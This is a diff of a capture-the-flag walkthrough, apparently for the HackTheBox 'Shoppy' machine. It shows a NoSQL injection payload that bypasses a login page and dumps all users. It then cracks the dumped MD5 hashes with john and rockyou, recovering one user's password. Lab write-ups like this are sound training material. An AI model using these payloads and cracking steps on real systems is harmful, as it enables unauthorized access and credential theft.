@@ -172,7 +172,7 @@ The only direcrories we can access on this webpage are ```/admin``` and ```/logi
 
 We have a login page, but we don't have creds we can use to login.
 
-Lets try SQLi bypass, 
+Lets try NoSQLi bypass, 
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6c1f1a6-1f23-4808-9aa3-3539a5c82285)
 
@@ -183,7 +183,41 @@ username:```admin'||'1'=='1```            password:```admin```
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb0bafee-2203-46ad-b39f-4b3d2f310b56)
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6cee8c85-5b58-412b-9273-ce25cd3ad415)
 
-We are logged in hehe
+We are logged in hehe. As we can see from the above screenshot we can search for other users. Lets search for the admin user
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/348fa5c1-91f7-4d5a-bd7a-4a0130a8973b)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e9f27062-2ed9-4ecc-92ea-5e22dae2f2b9)
+
+Well, we  can try to dump all users by using the NOSQL payload ```admin'||'1'=='1```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3ba82f27-0595-4a85-9bff-4b6ed00e0416)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/16c492f4-afcb-40c6-9433-b469b86af99e)
+
+We were able to dump all the users in the database.
+
+We'll be performing some hash cracking here 
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/shoppy]
+└─$ nano hash.txt               
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/shoppy]
+└─$ cat hash.txt  
+admin:23c6877d9e2b564ef8b32c3a23de27b2
+josh:6ebcea65320589ca4f2f1ce039975995
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/shoppy]
+└─$ john hash.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt  --format=RAW-md5
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+remembermethisway (josh)     
+1g 0:00:00:02 DONE (2023-09-13 12:37) 0.4329g/s 6209Kp/s 6209Kc/s 6560KC/s  fuckyooh21..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+```
+Nice😎
 
 Lets continue with our enumeration by enumerating for subdomains,
 
